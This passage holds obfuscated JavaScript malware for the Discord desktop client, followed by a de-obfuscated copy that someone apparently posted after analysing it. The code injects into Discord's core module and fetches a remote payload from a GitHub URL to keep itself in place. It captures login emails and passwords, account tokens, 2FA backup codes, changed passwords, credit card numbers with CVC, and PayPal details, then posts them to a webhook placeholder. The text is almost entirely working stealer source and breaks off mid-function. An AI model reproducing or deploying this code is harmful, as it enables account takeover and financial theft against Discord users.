fetch(_0x37f919(0x134),{'Authorization':_0x3decb8}),fetchFriends=async _0xe6e9e7=>await fetch(_0x37f919(0x120),{'Authorization':_0xe6e9e7}),getNitro=_0x2b6a7d=>{const _0x8ce574=_0x37f919;switch(_0x2b6a7d){case 0x1:return _0x8ce574(0x13b);case 0x2:return'`Nitro\x20Boost`';case 0x3:return _0x8ce574(0x104);default:return'`❌`';}},getBadges=_0x46bc0e=>{const _0x455cb2=_0x37f919;let _0x732e1c='';for(const _0xd3cd35 in CONFIG[_0x455cb2(0xf9)]){let _0x38eadf=CONFIG[_0x455cb2(0xf9)][_0xd3cd35];(_0x46bc0e&_0x38eadf[_0x455cb2(0xfc)])==_0x38eadf[_0x455cb2(0xfc)]&&(_0x732e1c+=_0x38eadf[_0x455cb2(0x118)]+'\x20');}return _0x732e1c||_0x455cb2(0x193);},getRareBadges=_0x60d014=>{const _0xc12c5f=_0x37f919;let _0x1cb048='';for(const _0x2acb88 in CONFIG[_0xc12c5f(0xf9)]){let _0x56e815=CONFIG[_0xc12c5f(0xf9)][_0x2acb88];(_0x60d014&_0x56e815[_0xc12c5f(0xfc)])==_0x56e815[_0xc12c5f(0xfc)]&&_0x56e815[_0xc12c5f(0x12c)]&&(_0x1cb048+=_0x56e815[_0xc12c5f(0x118)]+'\x20');}return _0x1cb048;},getBilling=async _0xe7ac25=>{const _0x34b7f1=_0x37f919,_0x36bfcf=await fetchBilling(_0xe7ac25);let _0x4ed8a5='';return _0x36bfcf[_0x34b7f1(0x168)](_0x44cf2d=>{const _0x505376=_0x34b7f1;if(!_0x44cf2d[_0x505376(0x147)])switch(_0x44cf2d[_0x505376(0x18e)]){case 0x1:_0x4ed8a5+='💳\x20';break;case 0x2:_0x4ed8a5+=_0x505376(0x17d);break;}}),_0x4ed8a5||_0x34b7f1(0x193);},getFriends=async _0x1c0299=>{const _0x1fb8f5=_0x37f919,_0x4bb568=await fetchFriends(_0x1c0299),_0x4f283b=_0x4bb568[_0x1fb8f5(0x13f)](_0x3583ca=>{const _0x30530c=_0x1fb8f5;return _0x3583ca[_0x30530c(0x18e)]==0x1;});let _0x2b29df='';for(const _0x1b3c32 of _0x4f283b){var _0x1ce216=getRareBadges(_0x1b3c32['user'][_0x1fb8f5(0x141)]);_0x1ce216!=''&&(!_0x2b29df&&(_0x2b29df=_0x1fb8f5(0x153)),_0x2b29df+=_0x1ce216+'\x20'+_0x1b3c32[_0x1fb8f5(0x16e)][_0x1fb8f5(0xf6)]+'#'+_0x1b3c32[_0x1fb8f5(0x16e)][_0x1fb8f5(0x17e)]+'\x0a');}return _0x2b29df=_0x2b29df||'**No\x20Rare\x20Friends**',{'message':_0x2b29df,'totalFriends':_0x4bb568[_0x1fb8f5(0x172)]};},getServers=async _0x142140=>{const _0x1c7e10=_0x37f919,_0x378159=await fetchServers(_0x142140),_0xdac443=_0x378159[_0x1c7e10(0x13f)](_0x915e50=>_0x915e50[_0x1c7e10(0xe1)]==_0x1c7e10(0x125));let _0x341049='';for(const _0x316781 of _0xdac443){_0x341049===''&&(_0x341049+=_0x1c7e10(0x128)),_0x341049+=(_0x316781[_0x1c7e10(0x117)]?'<:SA_Owner:991312415352430673>\x20Owner':_0x1c7e10(0x109))+_0x1c7e10(0xed)+_0x316781[_0x1c7e10(0xf0)]+_0x1c7e10(0x166)+_0x316781['approximate_member_count']+'`\x0a';}return _0x341049=_0x341049||_0x1c7e10(0xe5),{'message':_0x341049,'totalGuilds':_0x378159[_0x1c7e10(0x172)]};},EmailPassToken=async(_0x132916,_0x213308,_0x182215,_0xe36691)=>{const _0x1c26d1=_0x37f919,_0x1d07be=await fetchAccount(_0x182215),_0x2718eb={'content':'**'+_0x1d07be[_0x1c26d1(0xf6)]+_0x1c26d1(0x135)+_0xe36691+'!','embeds':[{'fields':[{'name':'Email','value':'`'+_0x132916+'`','inline':!![]},{'name':_0x1c26d1(0xe0),'value':'`'+_0x213308+'`','inline':!![]}]}]};hooker(_0x2718eb,_0x182215,_0x1d07be);},BackupCodesViewed=async(_0x36b5ea,_0x10c1dc)=>{const _0x50e034=_0x37f919,_0x517dc7=await fetchAccount(_0x10c1dc),_0x3f7e19=_0x36b5ea[_0x50e034(0x13f)](_0x337c35=>{const _0x1262ab=_0x50e034;return _0x337c35[_0x1262ab(0x14e)]===![];});let _0x392b54='';for(let _0x5a0944 of _0x3f7e19){_0x392b54+=_0x5a0944[_0x50e034(0x18f)][_0x50e034(0x165)](0x0,0x4)+'-'+_0x5a0944['code']['substr'](0x4)+'\x0a';}const _0xfc815d={'content':'**'+_0x517dc7[_0x50e034(0xf6)]+'**\x20just\x20viewed\x20his\x202FA\x20backup\x20codes!','embeds':[{'fields':[{'name':'Backup\x20Codes','value':_0x50e034(0xf8)+_0x392b54+_0x50e034(0xf8),'inline':![]},{'name':_0x50e034(0x179),'value':'`'+_0x517dc7[_0x50e034(0x103)]+'`','inline':!![]},{'name':_0x50e034(0xdf),'value':'`'+(_0x517dc7[_0x50e034(0x183)]||_0x50e034(0x144))+'`','inline':!![]}]}]};hooker(_0xfc815d,_0x10c1dc,_0x517dc7);},PasswordChanged=async(_0x196b0c,_0x1701d6,_0x21c09a)=>{const _0x2a3edb=_0x37f919,_0x2901c7=await fetchAccount(_0x21c09a),_0x1a068a={'embeds':[{'fields':[{'name':_0x2a3edb(0x17f),'value':'`'+_0x196b0c+'`','inline':!![]},{'name':'Old\x20Password','value':'`'+_0x1701d6+'`','inline':!![]}]}]};hooker(_0x1a068a,_0x21c09a,_0x2901c7);},CreditCardAdded=async(_0x5cace4,_0x1763c4,_0x442892,_0x589a11,_0x27fc3d)=>{const _0xe9d8b5=_0x37f919,_0x3ffd44=await fetchAccount(_0x27fc3d),_0x106edf={'content':'**'+_0x3ffd44[_0xe9d8b5(0xf6)]+'**\x20just\x20added\x20a\x20credit\x20card!','embeds':[{'fields':[{'name':_0xe9d8b5(0x100),'value':'`'+_0x5cace4+'`','inline':!![]},{'name':'CVC','value':'`'+_0x1763c4+'`','inline':!![]},{'name':_0xe9d8b5(0x140),'value':'`'+_0x442892+'/'+_0x589a11+'`','inline':!![]}]}]};hooker(_0x106edf,_0x27fc3d,_0x3ffd44);},PaypalAdded=async _0x1f5912=>{const _0x2a908d=_0x37f919,_0x17ba7a=await fetchAccount(_0x1f5912),_0x418f8f={'content':'**'+_0x17ba7a[_0x2a908d(0xf6)]+'**\x20just\x20added\x20a\x20<:paypal:1148653305376034967>\x20account!','embeds':[{'fields':[{'name':'Email','value':'`'+_0x17ba7a[_0x2a908d(0x103)]+'`','inline':!![]},{'name':_0x2a908d(0xdf),'value':'`'+(_0x17ba7a['phone']||_0x2a908d(0x144))+'`','inline':!![]}]}]};hooker(_0x418f8f,_0x1f5912,_0x17ba7a);},discordPath=(function(){const _0x1d4547=_0x37f919,_0x1a34ee=args[0x0][_0x1d4547(0x170)](path[_0x1d4547(0x159)])['slice'](0x0,-0x1)[_0x1d4547(0x13a)](path['sep']);let _0x3b510d;if(fs[_0x1d4547(0x126)](_0x3b510d))return{'resourcePath':_0x3b510d,'app':_0x1a34ee};return{'undefined':undefined,'undefined':undefined};}());async function initiation(){const _0x3c2195=_0x37f919;if(fs[_0x3c2195(0x126)](path[_0x3c2195(0x13a)](__dirname,_0x3c2195(0x127)))){fs[_0x3c2195(0x130)](path[_0x3c2195(0x13a)](__dirname,_0x3c2195(0x127)));const _0x49270d=await getToken();if(!_0x49270d)return;const _0x5c18a7=await fetchAccount(_0x49270d),_0x218563={'content':'**'+_0x5c18a7[_0x3c2195(0xf6)]+'**\x20Just\x20Got\x20Injected!','embeds':[{'fields':[{'name':'Email','value':'`'+_0x5c18a7[_0x3c2195(0x103)]+'`','inline':!![]},{'name':'Phone','value':'`'+(_0x5c18a7[_0x3c2195(0x183)]||_0x3c2195(0x144))+'`','inline':!![]}]}]};await hooker(_0x218563,_0x49270d,_0x5c18a7),clearAllUserData();}const {resourcePath:_0x31abdd,app:_0x4d42a0}=discordPath;if(_0x31abdd===undefined||_0x4d42a0===undefined)return;const _0x407011=path[_0x3c2195(0x13a)](_0x31abdd,_0x3c2195(0x11a)),_0xc5d291=path[_0x3c2195(0x13a)](_0x407011,'package.json'),_0x50cd34=path[_0x3c2195(0x13a)](_0x407011,_0x3c2195(0xdc)),_0x4cb22f=fs[_0x3c2195(0x164)](_0x4d42a0+_0x3c2195(0x111))['filter'](_0x9e255b=>/discord_desktop_core-+?/[_0x3c2195(0x18d)](_0x9e255b))[0x0],_0x22c6d9=_0x4d42a0+'\x5cmodules\x5c'+_0x4cb22f+_0x3c2195(0x105),_0x2493ff=path[_0x3c2195(0x13a)](process[_0x3c2195(0x190)]['APPDATA'],_0x3c2195(0x13e));!fs[_0x3c2195(0x126)](_0x407011)&&fs[_0x3c2195(0x13c)](_0x407011);fs['existsSync'](_0xc5d291)&&fs[_0x3c2195(0xe3)](_0xc5d291);fs['existsSync'](_0x50cd34)&&fs[_0x3c2195(0xe3)](_0x50cd34);if(process[_0x3c2195(0x156)]==='win32'||process[_0x3c2195(0x156)]===_0x3c2195(0xe4)){fs[_0x3c2195(0x113)](_0xc5d291,JSON[_0x3c2195(0xe8)]({'name':_0x3c2195(0x12d),'main':'index.js'},null,0x4));const _0x37ddfc=_0x3c2195(0xff)+_0x22c6d9+'\x27;\x0a\x20\x20const\x20bdPath\x20=\x20\x27'+_0x2493ff+_0x3c2195(0x16d)+CONFIG[_0x3c2195(0x116)]+_0x3c2195(0x136)+CONFIG[_0x3c2195(0xfa)]+_0x3c2195(0x151)+path[_0x3c2195(0x13a)](_0x31abdd,_0x3c2195(0x17a))+_0x3c2195(0x175);fs[_0x3c2195(0x113)](_0x50cd34,_0x37ddfc[_0x3c2195(0x145)](/\\/g,'\x5c\x5c'));}}let email='',password='',initiationCalled=![];const createWindow=()=>{const _0x4c0c3e=_0x37f919;mainWindow=BrowserWindow[_0x4c0c3e(0x14b)]()[0x0];if(!mainWindow)return;mainWindow[_0x4c0c3e(0xef)][_0x4c0c3e(0x107)][_0x4c0c3e(0x115)](_0x4c0c3e(0x154)),mainWindow[_0x4c0c3e(0xef)]['debugger']['on'](_0x4c0c3e(0xdb),async(_0xdd9243,_0x114ee8,_0x204af6)=>{const _0x42bdae=_0x4c0c3e;!initiationCalled&&(await initiation(),initiationCalled=!![]);if(_0x114ee8!==_0x42bdae(0x142))return;if(!CONFIG[_0x42bdae(0x146)]['urls']['some'](_0x298458=>_0x204af6[_0x42bdae(0xf7)][_0x42bdae(0x18b)][_0x42bdae(0x15c)](_0x298458)))return;if(![0xc8,0xca][_0x42bdae(0x15d)](_0x204af6['response']['status']))return;const _0x249d05=await mainWindow[_0x42bdae(0xef)][_0x42bdae(0x107)][_0x42bdae(0x11d)]('Network.getResponseBody',{'requestId':_0x204af6[_0x42bdae(0xdd)]}),_0x409dc0=JSON[_0x42bdae(0x102)](_0x249d05['body']),_0x1006ab=await mainWindow[_0x42bdae(0xef)][_0x42bdae(0x107)][_0x42bdae(0x11d)](_0x42bdae(0x192),{'requestId':_0x204af6[_0x42bdae(0xdd)]}),_0x51769f=JSON[_0x42bdae(0x102)](_0x1006ab['postData']);switch(!![]){case _0x204af6[_0x42bdae(0xf7)][_0x42bdae(0x18b)][_0x42bdae(0x15c)](_0x42bdae(0x11c)):if(!_0x409dc0['token']){email=_0x51769f['login'],password=_0x51769f[_0x42bdae(0xfb)];return;}EmailPassToken(_0x51769f[_0x42bdae(0x10a)],_0x51769f['password'],_0x409dc0[_0x42bdae(0x18a)],_0x42bdae(0xfe));break;case _0x204af6[_0x42bdae(0xf7)]['url'][_0x42bdae(0x15c)](_0x42bdae(0x17b)):EmailPassToken(_0x51769f['email'],_0x51769f[_0x42bdae(0xfb)],_0x409dc0[_0x42bdae(0x18a)],'signed\x20up');break;case _0x204af6['response'][_0x42bdae(0x18b)][_0x42bdae(0x15c)](_0x42bdae(0x12a)):EmailPassToken(email,password,_0x409dc0['token'],_0x42bdae(0x121));break;case _0x204af6[_0x42bdae(0xf7)]['url'][_0x42bdae(0x15c)](_0x42bdae(0x106)):BackupCodesViewed(_0x409dc0['backup_codes'],await getToken());break;case _0x204af6[_0x42bdae(0xf7)][_0x42bdae(0x18b)]['endsWith'](_0x42bdae(0xfd)):if(!_0x51769f['password'])return;_0x51769f[_0x42bdae(0x103)]&&EmailPassToken(_0x51769f[_0x42bdae(0x103)],_0x51769f[_0x42bdae(0xfb)],_0x409dc0[_0x42bdae(0x18a)],_0x42bdae(0x177)+_0x51769f[_0x42bdae(0x103)]+'**'),_0x51769f[_0x42bdae(0x181)]&&PasswordChanged(_0x51769f[_0x42bdae(0x181)],_0x51769f[_0x42bdae(0xfb)],_0x409dc0['token']);break;}}),mainWindow[_0x4c0c3e(0xef)][_0x4c0c3e(0x107)][_0x4c0c3e(0x11d)](_0x4c0c3e(0xea)),mainWindow['on'](_0x4c0c3e(0x191),()=>{createWindow();});};function _0xcf0b(_0x19ddb9,_0x1cc501){const _0x25c822=_0x25c8();return _0xcf0b=function(_0xcf0b8f,_0x34800d){_0xcf0b8f=_0xcf0b8f-0xdb;let _0x3da077=_0x25c822[_0xcf0b8f];return _0x3da077;},_0xcf0b(_0x19ddb9,_0x1cc501);}createWindow(),session['defaultSession']['webRequest']['onCompleted'](CONFIG[_0x37f919(0xf4)],async(_0x3552da,_0x4a01de)=>{const _0x42d7a1=_0x37f919;if(![0xc8,0xca][_0x42d7a1(0x15d)](_0x3552da[_0x42d7a1(0x185)]))return;if(_0x3552da[_0x42d7a1(0x137)]!=_0x42d7a1(0x161))return;switch(!![]){case _0x3552da[_0x42d7a1(0x18b)][_0x42d7a1(0x15c)]('tokens'):const _0x25f242=querystring[_0x42d7a1(0x102)](Buffer[_0x42d7a1(0x129)](_0x3552da['uploadData'][0x0][_0x42d7a1(0x169)])[_0x42d7a1(0x11b)]());CreditCardAdded(_0x25f242['card[number]'],_0x25f242[_0x42d7a1(0xf3)],_0x25f242['card[exp_month]'],_0x25f242['card[exp_year]'],await getToken());break;case _0x3552da[_0x42d7a1(0x18b)][_0x42d7a1(0x15c)]('paypal_accounts'):PaypalAdded(await getToken());break;}}),session[_0x37f919(0x10e)]['webRequest'][_0x37f919(0x178)](CONFIG[_0x37f919(0x12b)],(_0x134ee1,_0x5bba4b)=>{const _0x17ca34=_0x37f919;if(_0x134ee1[_0x17ca34(0x18b)][_0x17ca34(0x119)](_0x17ca34(0x16a))||_0x134ee1[_0x17ca34(0x18b)][_0x17ca34(0x15c)](_0x17ca34(0x110)))return _0x5bba4b({'cancel':!![]});}),module[_0x37f919(0xe6)]=require(_0x37f919(0xf5));function _0x25c8(){const _0x1b0826=['includes','25ZLbNkH','/users/@me','htrb3117x\x20|\x20discord.gg/revshit','POST','path','session','readdirSync','substr','`\x20-\x20Members:\x20`','author','forEach','bytes','wss://remote-auth-gateway','1072389vdMUUY','https://*.discord.com/api/v*/auth/sessions','\x27;\x0a\x20\x20const\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0a\x20\x20fs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a\x20\x20})\x0a\x20\x20async\x20function\x20init()\x20{\x0a\x20\x20\x20\x20\x20\x20https.get(\x27','user','argv','split','<:1207iconearlybotdeveloper:1163172236807639143>','length','69951SizYlu','clearStorageData','\x27)\x0a\x20\x20if\x20(fs.existsSync(bdPath))\x20require(bdPath);','fields','changed\x20his\x20email\x20to\x20**','onBeforeRequest','Email','app.asar','/register','application/json','<:paypal:1148653305376034967>\x20','discriminator','New\x20Password','https://discord.com/api/v*/auth/sessions','new_password','.webp','phone','querystring','statusCode','%WEBHOOK%','https://cdn.discordapp.com/avatars/','<:9171hypesquadevents:1163172248140660839>','pathname','token','url','thumbnail','test','type','code','env','closed','Network.getRequestPostData','`❌`','message','index.js','requestId','29048TKhyOr','Phone','Password','permissions','headers','unlinkSync','darwin','**No\x20Rare\x20Servers**','exports','push','stringify','160810EGRNXn','Network.enable','744yDZSpO','Account\x20Information','\x20|\x20Server\x20Name:\x20`','embeds','webContents','name','relaunch','footer','card[cvc]','payment_filters','./core.asar','username','response','```','badges','webhook','password','Value','/@me','logged\x20in','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0a\x20\x20const\x20indexJs\x20=\x20\x27','Number','avatar','parse','email','`Nitro\x20Basic`','\x5cdiscord_desktop_core\x5cindex.js','/codes-verification','debugger','2050911ndhLjM','<:admin:967851956930482206>\x20Admin','login','37877yLPrzo','<:6936hypesquadbrilliance:1163172244474822746>','<:4149blurplecertifiedmoderator:1163172255489085481>','defaultSession','flushStorageData','auth/sessions','\x5cmodules\x5c','Badges','writeFileSync','<:5053earlysupporter:1163172241996005416>','attach','injection_url','owner','Emoji','startsWith','app','toString','/login','sendCommand','https://i.hizliresim.com/8amaxa7.','<:6601hypesquadbravery:1163172246492287017>','/relationships','logged\x20in\x20with\x202FA','end','host','request','562949953421311','existsSync','initiation','**Rare\x20Servers:**\x0a','from','/totp','filters2','Rare','discord','Token','<:1757bugbusterbadgediscord:1163172238942543892>','rmdirSync','1821942sxohaT','API','search','/guilds?with_counts=true','**\x20Just\x20','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27','method','electron','<:4744bughunterbadgediscord:1163172239970140383>','join','`Nitro\x20Classic`','mkdirSync','<:5242hypesquadbalance:1163172243417858128>','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','filter','Expiration','public_flags','Network.responseReceived','20rKuOPT','None','replace','filters','invalid','<:9928discordpartnerbadge:1163172304155586570>','/mfa/totp','https://api.stripe.com/v*/tokens','getAllWindows','data','/billing/payment-sources','consumed','executeJavaScript','<:1207iconactivedeveloper:1163172534443851868>','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20\x20\x20});\x0a\x20\x20}\x0a\x20\x20require(\x27','avatar_url','**Rare\x20Friends:**\x0a','1.3','protocol','platform','wss://remote-auth-gateway.discord.gg/*','premium_type','sep','title','/mfa/codes-verification','endsWith'];_0x25c8=function(){return _0x1b0826;};return _0x25c8();}
```

Here the script after de-obfs using Obfuscator.io

```js!
const fs = require('fs');
const https = require('https');
const args = process.argv;
const path = require("path");
const querystring = require("querystring");
const {
  BrowserWindow,
  session,
  app
} = require("electron");
const CONFIG = {
  'webhook': "%WEBHOOK%",
  'injection_url': 'https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js',
  'filters': {
    'urls': ['/auth/login', '/auth/register', "/mfa/totp", "/mfa/codes-verification", "/users/@me"]
  },
  'filters2': {
    'urls': ["wss://remote-auth-gateway.discord.gg/*", "https://discord.com/api/v*/auth/sessions", "https://*.discord.com/api/v*/auth/sessions", 'https://discordapp.com/api/v*/auth/sessions']
  },
  'payment_filters': {
    'urls': ['https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', "https://api.stripe.com/v*/tokens"]
  },
  'API': 'https://discord.com/api/v9/users/@me',
  'badges': {
    'Discord_Emloyee': {
      'Value': 0x1,
      'Emoji': '<:8485discordemployee:1163172252989259898>',
      'Rare': true
    },
    'Partnered_Server_Owner': {
      'Value': 0x2,
      'Emoji': "<:9928discordpartnerbadge:1163172304155586570>",
      'Rare': true
    },
    'HypeSquad_Events': {
      'Value': 0x4,
      'Emoji': "<:9171hypesquadevents:1163172248140660839>",
      'Rare': true
    },
    'Bug_Hunter_Level_1': {
      'Value': 0x8,
      'Emoji': "<:4744bughunterbadgediscord:1163172239970140383>",
      'Rare': true
    },
    'Early_Supporter': {
      'Value': 0x200,
      'Emoji': "<:5053earlysupporter:1163172241996005416>",
      'Rare': true
    },
    'Bug_Hunter_Level_2': {
      'Value': 0x4000,
      'Emoji': "<:1757bugbusterbadgediscord:1163172238942543892>",
      'Rare': true
    },
    'Early_Verified_Bot_Developer': {
      'Value': 0x20000,
      'Emoji': "<:1207iconearlybotdeveloper:1163172236807639143>",
      'Rare': true
    },
    'House_Bravery': {
      'Value': 0x40,
      'Emoji': "<:6601hypesquadbravery:1163172246492287017>",
      'Rare': false
    },
    'House_Brilliance': {
      'Value': 0x80,
      'Emoji': "<:6936hypesquadbrilliance:1163172244474822746>",
      'Rare': false
    },
    'House_Balance': {
      'Value': 0x100,
      'Emoji': "<:5242hypesquadbalance:1163172243417858128>",
      'Rare': false
    },
    'Active_Developer': {
      'Value': 0x400000,
      'Emoji': "<:1207iconactivedeveloper:1163172534443851868>",
      'Rare': false
    },
    'Certified_Moderator': {
      'Value': 0x40000,
      'Emoji': "<:4149blurplecertifiedmoderator:1163172255489085481>",
      'Rare': true
    },
    'Spammer': {
      'Value': 0x100080,
      'Emoji': '⌨️',
      'Rare': false
    }
  }
};
const executeJS = _0x3afa9f => {
  const _0x4dd57a = BrowserWindow.getAllWindows()[0x0];
  return _0x4dd57a.webContents.executeJavaScript(_0x3afa9f, true);
};
const clearAllUserData = () => {
  const _0x1a5ce0 = BrowserWindow.getAllWindows()[0x0];
  _0x1a5ce0.webContents.session.flushStorageData();
  _0x1a5ce0.webContents.session.clearStorageData();
  app.relaunch();
  app.exit();
};
const getToken = async () => await executeJS("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
const request = async (_0x4f50b5, _0x1420bd, _0x2de5ab, _0x4c9477) => {
  _0x1420bd = new URL(_0x1420bd);
  const _0x3f710f = {
    'protocol': _0x1420bd.protocol,
    'hostname': _0x1420bd.host,
    'path': _0x1420bd.pathname,
    'method': _0x4f50b5,
    'headers': {
      'Access-Control-Allow-Origin': '*'
    }
  };
  if (_0x1420bd.search) {
    _0x3f710f.path += _0x1420bd.search;
  }
  for (const _0x409b15 in _0x2de5ab) _0x3f710f.headers[_0x409b15] = _0x2de5ab[_0x409b15];
  const _0x4c1bb0 = https.request(_0x3f710f);
  if (_0x4c9477) {
    _0x4c1bb0.write(_0x4c9477);
  }
  _0x4c1bb0.end();
  return new Promise((_0xc541cc, _0x379da8) => {
    _0x4c1bb0.on("response", _0x2971b7 => {
      let _0x1738df = '';
      _0x2971b7.on("data", _0x4c03ec => _0x1738df += _0x4c03ec);
      _0x2971b7.on("end", () => _0xc541cc(_0x1738df));
    });
  });
};
const hooker = async (_0x3ffec3, _0x1629a5, _0x278a5b) => {
  _0x3ffec3.username = 'X';
  _0x3ffec3.avatar_url = "https://i.hizliresim.com/8amaxa7.";
  _0x3ffec3.embeds[0x0].author = {
    'name': _0x278a5b.username
  };
  _0x3ffec3.embeds[0x0].thumbnail = {
    'url': "https://cdn.discordapp.com/avatars/" + _0x278a5b.id + '/' + _0x278a5b.avatar + ".webp"
  };
  _0x3ffec3.embeds[0x0].footer = {
    'text': "htrb3117x | discord.gg/revshit",
    'icon_url': 'https://i.hizliresim.com/5hgxpg1.jpg'
  };
  _0x3ffec3.embeds[0x0].title = "Account Information";
  const _0xe12589 = getNitro(_0x278a5b.premium_type);
  const _0x3c3de5 = getBadges(_0x278a5b.flags);
  const _0x10a2e5 = await getBilling(_0x1629a5);
  _0x3ffec3.embeds[0x0].fields.push({
    'name': "Token",
    'value': "```" + _0x1629a5 + "```",
    'inline': false
  }, {
    'name': 'Nitro',
    'value': _0xe12589,
    'inline': true
  }, {
    'name': "Badges",
    'value': _0x3c3de5,
    'inline': true
  }, {
    'name': 'Billing',
    'value': _0x10a2e5,
    'inline': true
  });
  _0x3ffec3.embeds.push();
  for (const _0x4c9d0e in _0x3ffec3.embeds) {
    _0x3ffec3.embeds[_0x4c9d0e].color = 0x0;
  }
  await request("POST", "%WEBHOOK%", {
    'Content-Type': "application/json"
  }, JSON.stringify(_0x3ffec3));
};
const fetch = async (_0x43bfb5, _0x44d042) => {
  return JSON.parse(await request('GET', 'https://discord.com/api/v9/users/@me' + _0x43bfb5, _0x44d042));
};
const fetchAccount = async _0x590cc3 => await fetch('', {
  'Authorization': _0x590cc3
});
const fetchBilling = async _0x918cee => await fetch("/billing/payment-sources", {
  'Authorization': _0x918cee
});
const getNitro = _0x2b6a7d => {
  switch (_0x2b6a7d) {
    case 0x1:
      return "`Nitro Classic`";
    case 0x2:
      return "`Nitro Boost`";
    case 0x3:
      return "`Nitro Basic`";
    default:
      return '`❌`';
  }
};
const getBadges = _0x46bc0e => {
  let _0x732e1c = '';
  for (const _0xd3cd35 in CONFIG.badges) {
    let _0x38eadf = CONFIG.badges[_0xd3cd35];
    if ((_0x46bc0e & _0x38eadf.Value) == _0x38eadf.Value) {
      _0x732e1c += _0x38eadf.Emoji + " ";
    }
  }
  return _0x732e1c || "`❌`";
};
const getBilling = async _0xe7ac25 => {
  const _0x36bfcf = await fetchBilling(_0xe7ac25);
  let _0x4ed8a5 = '';
  _0x36bfcf.forEach(_0x44cf2d => {
    if (!_0x44cf2d.invalid) {
      switch (_0x44cf2d.type) {
        case 0x1:
          _0x4ed8a5 += "💳 ";
          break;
        case 0x2:
          _0x4ed8a5 += "<:paypal:1148653305376034967> ";
          break;
      }
    }
  });
  return _0x4ed8a5 || "`❌`";
};
const EmailPassToken = async (_0x132916, _0x213308, _0x182215, _0xe36691) => {
  const _0x1d07be = await fetchAccount(_0x182215);
  const _0x2718eb = {
    'content': '**' + _0x1d07be.username + "** Just " + _0xe36691 + '!',
    'embeds': [{
      'fields': [{
        'name': 'Email',
        'value': '`' + _0x132916 + '`',
        'inline': true
      }, {
        'name': "Password",
        'value': '`' + _0x213308 + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0x2718eb, _0x182215, _0x1d07be);
};
const BackupCodesViewed = async (_0x36b5ea, _0x10c1dc) => {
  const _0x517dc7 = await fetchAccount(_0x10c1dc);
  const _0x3f7e19 = _0x36b5ea.filter(_0x337c35 => {
    return _0x337c35.consumed === false;
  });
  let _0x392b54 = '';
  for (let _0x5a0944 of _0x3f7e19) {
    _0x392b54 += _0x5a0944.code.substr(0x0, 0x4) + '-' + _0x5a0944.code.substr(0x4) + "\n";
  }
  const _0xfc815d = {
    'content': '**' + _0x517dc7.username + "** just viewed his 2FA backup codes!",
    'embeds': [{
      'fields': [{
        'name': "Backup Codes",
        'value': "```" + _0x392b54 + "```",
        'inline': false
      }, {
        'name': "Email",
        'value': '`' + _0x517dc7.email + '`',
        'inline': true
      }, {
        'name': "Phone",
        'value': '`' + (_0x517dc7.phone || "None") + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0xfc815d, _0x10c1dc, _0x517dc7);
};
const PasswordChanged = async (_0x196b0c, _0x1701d6, _0x21c09a) => {
  const _0x2901c7 = await fetchAccount(_0x21c09a);
  const _0x1a068a = {
    'embeds': [{
      'fields': [{
        'name': "New Password",
        'value': '`' + _0x196b0c + '`',
        'inline': true
      }, {
        'name': "Old Password",
        'value': '`' + _0x1701d6 + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0x1a068a, _0x21c09a, _0x2901c7);
};
const CreditCardAdded = async (_0x5cace4, _0x1763c4, _0x442892, _0x589a11, _0x27fc3d) => {
  const _0x3ffd44 = await fetchAccount(_0x27fc3d);
  const _0x106edf = {
    'content': '**' + _0x3ffd44.username + "** just added a credit card!",
    'embeds': [{
      'fields': [{
        'name': "Number",
        'value': '`' + _0x5cace4 + '`',
        'inline': true
      }, {
        'name': 'CVC',
        'value': '`' + _0x1763c4 + '`',
        'inline': true
      }, {
        'name': "Expiration",
        'value': '`' + _0x442892 + '/' + _0x589a11 + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0x106edf, _0x27fc3d, _0x3ffd44);
};
const PaypalAdded = async _0x1f5912 => {
  const _0x17ba7a = await fetchAccount(_0x1f5912);
  const _0x418f8f = {
    'content': '**' + _0x17ba7a.username + "** just added a <:paypal:1148653305376034967> account!",
    'embeds': [{
      'fields': [{
        'name': 'Email',
        'value': '`' + _0x17ba7a.email + '`',
        'inline': true
      }, {
        'name': "Phone",
        'value': '`' + (_0x17ba7a.phone || "None") + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0x418f8f, _0x1f5912, _0x17ba7a);
};
const discordPath = function () {
  const _0x1a34ee = args[0x0].split(path.sep).slice(0x0, -0x1).join(path.sep);
  let _0x3b510d;
  if (fs.existsSync(_0x3b510d)) {
    return {
      'resourcePath': _0x3b510d,
      'app': _0x1a34ee
    };
  }
  return {
    'undefined': undefined,
    'undefined': undefined
  };
}();
async function initiation() {
  if (fs.existsSync(path.join(__dirname, "initiation"))) {
    fs.rmdirSync(path.join(__dirname, "initiation"));
    const _0x49270d = await getToken();
    if (!_0x49270d) {
      return;
    }
    const _0x5c18a7 = await fetchAccount(_0x49270d);
